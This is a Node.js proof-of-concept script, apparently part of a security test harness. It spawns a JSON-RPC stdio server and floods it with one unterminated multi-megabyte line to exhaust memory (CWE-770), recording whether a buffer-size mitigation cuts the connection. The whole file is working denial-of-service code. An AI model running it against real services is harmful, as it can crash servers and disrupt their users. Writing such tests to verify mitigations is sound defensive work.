// Vector 3 -- Unbounded stdio stream (CWE-770), stdio transport,
// TypeScript reference server.
//
// Writes a single JSON-RPC "line" that is `size_mb` megabytes long and
// NEVER terminates it with '\n' -- i.e. exactly the pathological input
// the SDK's ReadBuffer has to keep accumulating in memory while it waits
// for a newline that never comes. Writes in modest chunks and stops early
// (recording bytes actually accepted) if the pipe errors out, which is
// exactly what happens once the mitigated server hits `maxBufferSize` and
// closes the connection.
//
// Usage: node attack.mjs <server_cmd_json> <size_mb> [chunk_kb]
// where <server_cmd_json> is a JSON array like ["node","servers/ts_stdio_server.mjs"]
// Prints one-line JSON summary to stdout: {sent_bytes, aborted, elapsed_s}

import { spawn } from "node:child_process";

export function sendUnboundedLine(proc, sizeMb, chunkKb = 256) {
  return new Promise((resolve) => {
    const chunk = Buffer.alloc(chunkKb * 1024, "A".charCodeAt(0));
    const totalBytes = Math.floor(sizeMb * 1024 * 1024);
    let sent = 0;
    let aborted = false;
    const t0 = process.hrtime.bigint();

    proc.stdin.on("error", () => { aborted = true; });

    function writeMore() {
      if (aborted || sent >= totalBytes) {
        const elapsed_s = Number(process.hrtime.bigint() - t0) / 1e9;
        resolve({ sent_bytes: sent, aborted, elapsed_s });
        return;
      }
      const remaining = totalBytes - sent;
      const piece = remaining >= chunk.length ? chunk : chunk.subarray(0, remaining);
      let ok;
      try {
        ok = proc.stdin.write(piece);
      } catch {
        aborted = true;
        writeMore();
        return;
      }
      sent += piece.length;
      if (ok) {
        setImmediate(writeMore);
      } else {
        proc.stdin.once("drain", writeMore);
        // also bail out if the stream errors while waiting to drain
        proc.stdin.once("error", () => { aborted = true; writeMore(); });
      }
    }
    writeMore();
  });
}

async function main() {
  const serverCmd = JSON.parse(process.argv[2]);
  const sizeMb = parseFloat(process.argv[3]);
  const proc = spawn(serverCmd[0], serverCmd.slice(1), { stdio: ["pipe", "pipe", "pipe"] });
  await new Promise((r) => setTimeout(r, 800));
  const result = await sendUnboundedLine(proc, sizeMb);
  console.log(JSON.stringify(result));
  proc.kill();
}

if (import.meta.url === `file://${process.argv[1]}`) {
  main();
}
